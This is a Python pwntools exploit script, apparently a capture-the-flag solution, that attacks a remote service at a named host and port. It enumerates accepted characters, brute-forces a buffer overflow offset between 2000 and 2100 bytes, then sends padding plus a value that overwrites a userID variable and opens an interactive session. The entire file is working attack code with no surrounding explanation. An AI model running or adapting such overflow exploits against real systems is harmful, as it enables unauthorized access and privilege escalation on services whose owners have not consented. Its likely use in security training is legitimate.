from pwn import *
import string
import time
from tqdm import tqdm

host = args.HOST or 'cfta-bx01.allyourbases.co'
port = int(args.PORT or 8013)

print("Find acceptable characters...")

acceptable_characters = []
for character in tqdm(string.printable, desc="Trying all ASCII characters"):
    io = connect(host, port)
    io.sendlineafter("DEBUG: Waiting 100ms", character)
    io.recvline()
    output = io.recvline()
    if b"DEBUG: Input length too large." not in output:
        acceptable_characters.append(character)
        print("%s is short enough!" % character)
    io.close()

print("Characters considered short enough: %s" % acceptable_characters)

print("Finding offset...")

offset = 0
for idx in tqdm(range(2000, 2100), desc="Finding offset"):
    io = connect(host, port)
    io.sendlineafter("DEBUG: Waiting 100ms", "#"*idx)
    # io.recvline()
    output = io.recvall(timeout=0.2)
    if b"ERROR: Expected userID Variable of 1." in output:
        offset = idx
        print("Offset: %i" % (idx - 1))  # Final offset is `2005`
        break
    io.close()

print("Executing final payload...")

io = connect(host, port)
io.sendlineafter("DEBUG: Waiting 100ms", '#'*offset+'1'*30)
io.interactive()
